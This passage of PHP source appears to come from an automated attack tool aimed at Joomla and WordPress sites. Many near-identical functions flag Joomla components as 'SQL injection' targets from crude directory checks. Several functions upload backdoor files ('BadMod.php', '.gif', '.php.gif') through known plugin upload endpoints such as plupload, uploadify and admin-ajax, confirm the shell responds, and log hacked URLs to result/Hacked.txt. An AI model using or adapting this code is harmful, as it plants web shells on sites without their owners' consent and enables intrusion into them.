echo $red."  [com_invitex] -=====================- ".$orange." Not Vuln \n";
}
}


function com_realpin($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_realpin/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_realpin] -=============- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_realpin] -=====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [com_realpin] -=====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_realpin] -=====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_realpin] -=====================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_realpin] -=====================- ".$orange." Not Vuln \n";
}
}
function com_jticketing($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_jticketing/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_jticketing] -==================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_jticketing] -==================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [com_jticketing] -==================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_jticketing] -==================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_jticketing] -==================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_jticketing] -==================- ".$orange." Not Vuln \n";
}
}


function com_bookpro($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_bookpro/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_bookpro] -=====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_bookpro] -=====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [com_bookpro] -=====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_bookpro] -=====================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_bookpro] -=====================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_bookpro] -=====================- ".$orange." Not Vuln \n";
}
}

function com_checklist($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_checklist/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_checklist] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_checklist] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [com_checklist] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_checklist] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_checklist] -===================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_checklist] -===================- ".$orange." Not Vuln \n";
}
}

function com_expautospro($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_expautospro/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_expautospro] -=================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_expautospro] -=================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [com_expautospro] -=================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_expautospro] -=================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_expautospro] -=================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_expautospro] -=================- ".$orange." Not Vuln \n";
}
}

function com_spmoviedb($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_spmoviedb/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_spmoviedb] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_spmoviedb] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [com_spmoviedb] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_spmoviedb] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_spmoviedb] -===================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_spmoviedb] -===================- ".$orange." Not Vuln \n";
}
}

function com_squadmanagement($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_squadmanagement/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_squadmanagement] -=============- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_squadmanagement] -=============- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [com_squadmanagement] -=============- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_squadmanagement] -=============- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_squadmanagement] -=============- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_squadmanagement] -=============- ".$orange." Not Vuln \n";
}
}

function com_ccnewsletter($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_ccnewsletter/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_ccnewsletter] -================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_ccnewsletter] -================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [com_ccnewsletter] -================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_ccnewsletter] -================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_ccnewsletter] -================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_ccnewsletter] -================- ".$orange." Not Vuln \n";
}
}
function com_jomcomdev($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/components/com_jomcomdev/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [com_jomcomdev] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [com_jomcomdev] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [com_jomcomdev] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [com_jomcomdev] -===================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [com_jomcomdev] -===================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [com_jomcomdev] -===================- ".$orange." Not Vuln \n";
}

}
function yj_sql($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/plugins/content/yj_bumpit/";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$source = @file_get_contents("$target1");
if(preg_match("/Index Of/",$source) OR preg_match("/Index of/",$source)){
echo $red."  [yj_sql] -==========================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(preg_match("/Forbidden/",$source)){
echo $red."  [yj_sql] -==========================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) < 40){
echo $red."  [yj_sql] -==========================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(empty($source)){
echo $red."  [yj_sql] -==========================- ".$green." Vuln \n";
$hacked = fopen("result/Sql.txt","a+");
$def = $target1." [~] Sql injection [~]";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
elseif(strlen($source) > 40 AND !empty($source) AND !preg_match("/Forbidden/",$source) AND !preg_match("/Index Of/",$source)){
echo $red."  [yj_sql] -==========================- ".$orange." Not Vuln \n";
}
}else{
echo $red."  [yj_sql] -==========================- ".$orange." Not Vuln \n";
}
}
function plupload($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/plupload/examples/upload.php";
$h = @file_get_contents("$target1");
if(@preg_match("/jsonrpc/",$h)){
$uploadfile="BackDoor/BadMod.jpg";
$uploadfile2="BackDoor/BadMod.php";
$uploadfile=@realpath($uploadfile) ;
$uploadfile2=@realpath($uploadfile2) ;
if (@function_exists('curl_file_create')) { // php 5.5+
  $cFile = @curl_file_create($uploadfile);
  $cFile2 = @curl_file_create($uploadfile2);
} else { // 
  $cFile = '@' . realpath($uploadfile);
  $cFile2 = '@' . realpath($uploadfile2);
}
$post = array('file'=> $cFile,'name' => $cFile2);
$ch = @curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=@curl_exec ($ch);
@curl_close ($ch);
$result = $target."/plupload/examples/uploads/BadMod.php";
$result = @file_get_contents("$result");
if(@preg_match("/Hacked/",$result)){
echo $red."  [plupload] -============- ".$green." Done";
$hacked = @fopen("result/Hacked.txt","a+");
$def = $target."/"."plupload/examples/uploads/BadMod.php";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
echo $red."  [plupload] -============- ".$orange." Failed ";
}else{
$target1 = $target."/plupload/examples/upload.php";
$h = @file_get_contents("$target1");
if(@preg_match("/jsonrpc/",$h)){
$uploadfile="BackDoor/BadMod.jpg";
$uploadfile2="BackDoor/BadMod.php";
$uploadfile=realpath($uploadfile) ;
$uploadfile2=realpath($uploadfile2) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
  $cFile2 = curl_file_create($uploadfile2);
} else { // 
  $cFile = '@' . realpath($uploadfile);
  $cFile2 = '@' . realpath($uploadfile2);
}
$post = array('file'=> $cFile,'name' => $cFile2);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$result = $target."/js/plupload/examples/uploads/BadMod.php";
$result = @file_get_contents("$result");
if(@preg_match("/Hacked/",$result)){
echo $red."  [plupload] -============- ".$green." Done";
$hacked = @fopen("result/Hacked.txt","a+");
$def = $target."/js/plupload/examples/uploads/BadMod.php";
@fwrite($hacked,$def);
@fwrite($hacked,"\n");
@fclose($hacked);
}
echo $red."  [plupload] -============- ".$orange." Failed ";
}
}
}

function wp_qual($target){
$op_system = php_uname();
if(@preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$uploadfile="BackDoor/BadMod.php";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('Filedata'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$result = trim($result);
if($result == 1){
echo $red."  [wp_qual] -============- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
$def = $target."/"."BadMod.php";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
echo $red."  [wp_qual] -============- ".$orange." Failed \n";
}
}
function GetWpVer($target){
$r = @file_get_contents("$target");
preg_match_all('<meta name="generator" content="(.*)" />',$r,$re);
foreach($re[1] AS $version){
if(!preg_match("/WordPress/",$version)){
$version = " UNKNOWN";	
}else{
$arr = "WordPress";
$version = str_replace($arr,"",$version);
$version = trim($version);
}
echo " ".$version;	
}
}
function wp_bsn($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
$target1 = $target."/wp-admin/admin-ajax.php?action=wpbdp-file-field-upload";
$uploadfile="BackDoor/BadMod.gif";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('file'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$m = date("m");
$y = date("y");
$result2 = $target."/wp-content/uploads/20$y/$m/BadMod.gif";
$src = @file_get_contents("$result2");
if(preg_match("/Hacked/",$src)){
echo $red."  [wp_bsn] -==============- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
echo $result;
echo $result2;
}else{
echo $red. "  [wp_bsn] -==============- ".$orange."Failed"." \n";
}
}

function wp_jbm($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/jm-ajax/upload_file";
$src = @file_get_contents("$target1");
if(preg_match("/files/",$src)){
$uploadfile="BackDoor/BadMod.gif";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('file'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$m = date("m");
$y = date("y");
$result2 = $target."/wp-content/uploads/20$y/$m/BadMod.gif";
echo $red."  [wp_jbm] -==============- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
}else{
echo $red. "  [wp_jbm] -==============- ".$orange."Failed"." \n";

}
}

function joom_ver($url){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$url)){
$url = "http://".$url;	
}
$url = $url."/language/en-GB/en-GB.xml";
$source = @file_get_contents("$url");
if(@preg_match("/xml/",$source)){
$source = @file_get_contents("$url");
$exp = @explode("\n",$source);
if(@preg_match("/xml/",$exp[0])){
unset($exp[0]);
}
if(preg_match("/metafile/",$exp[1])){
$arr = array(
'<' => "",
'metafile' => "",
'version' => "",
'=' => "",
'"' => "",
'client' => "",
'site' => "",
'>' => "",
);
$rb = str_replace(array_keys($arr),$arr,$exp[1]);
$version =  $red. "  [Version] -=========================- ".$green.trim($rb)."\n";
echo $version;
}elseif(preg_match("/metafile/",$exp[2])){
$arr = array(
'<' => "",
'metafile' => "",
'version' => "",
'=' => "",
'"' => "",
'client' => "",
'site' => "",
'>' => "",
);
$rb = str_replace(array_keys($arr),$arr,$exp[2]);
$version =  $red. "  [Version] -=========================-  ".$green.trim($rb)."\n";
echo $version;
}
else{
$version =  $red. "  [Version] -=========================-  ".$green." UNKNOWN"."\n";
echo $version;
}
}

}
function wp_upload2($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/wp-content/plugins/viral-optins/api/uploader/file-uploader.php";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$uploadfile="BackDoor/BadMod.txt";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('Filedata'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$m = date("m");
$y = date("y");
$result2 = $target."/wp-content/uploads/20$y/$m/BadMod.txt";
$h2 = @file_get_contents("$result2");
if(@preg_match("/MrSqar/",$h2)){
echo $red."  [upload] -==============- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$result2);
fwrite($hacked,"\n");
	}else{
echo $red. "  [wp_upload2] -==========- ".$orange."Failed"." \n";

}
}else{
echo $red. "  [wp_upload2] -==========- ".$orange."Failed"." \n";

}
}
function wp_blazeS($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$file = "BackDoor/BadMod.php.gif";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$target1 = $target."/wp-content/plugins/blaze-slide-show-for-wordpress/js/swfupload/js/upload.php";
$post = array('Filedata'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$hack = $target."/wp-content/plugins/blaze-slide-show-for-wordpress/js/swfupload/js/BadMod.php.gif";
$source = @file_get_contents("$hack");
if(preg_match("/Hacked/",$source)){
$hacked = fopen("result/Hacked.txt","a+");
echo $red."  [wp_blazeS] -===========- ".$green." Done ! \n";
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [wp_blazeS] -===========- ".$orange."Failed"." \n";	
}
}
function wp_blocker($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$file = "BackDoor/BadMod.php";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$target1 = $target."/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
$post = array('popimg'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$m = date("m");
$y = date("y");
